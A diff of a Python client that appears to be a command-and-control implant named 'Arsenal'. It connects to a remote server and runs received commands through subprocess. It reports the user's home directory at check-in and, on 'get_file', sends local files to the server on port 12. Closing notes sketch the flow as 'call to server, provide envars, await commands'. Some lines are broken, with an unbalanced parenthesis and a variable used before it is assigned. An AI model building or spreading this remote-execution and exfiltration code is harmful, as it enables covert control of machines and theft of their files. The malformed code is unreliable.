@@ -14,27 +14,30 @@ def main():
         try:
             received = s.recv(buff).strip().split()
             command = [ str(x, 'utf-8') for x in received ]
-            if 'Arsenal' in command:
-                output = b'Client initial checkin\n'
-                s.send(bytes(len(output)))
-                s.send(output)
-                output = bytes("Homedir: " + os.environ.get('HOME'), "utf-8")
-                s.send(bytes(len(output)))
-                s.send(output)
+            if 'cmd' in command:
+                del command[0]
+                print(command)
+                output = subprocess.run(command, stdout=subprocess.PIPE)
+            elif 'Arsenal' in command:
+                s.send(b'Client initial checkin\n')
+                s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
             elif 'get_file' in command:
                 fs=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 fs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                buff = 4096
                 fs.connect((args.server, 12))
                 with open(command[1]) as f:
                     fs.sendall(bytes(f.read()))
-            else:
-                print(command)
-                output = subprocess.run(command, stdout=subprocess.PIPE)
-                s.send(len(output.stdout))
-                s.send(bytes(output.stdout))
+            elif 'sendbuf' in command:
+                s.send(bytes(len(output.stdout))))
+            elif 'ack' in command:
+                s.sendall(bytes(output.stdout))
         except OSError as err:
             print("{0}\n".format(err))
 
 if __name__ == '__main__':
     main()
+
+
+call to server
+provide envars
+await commands
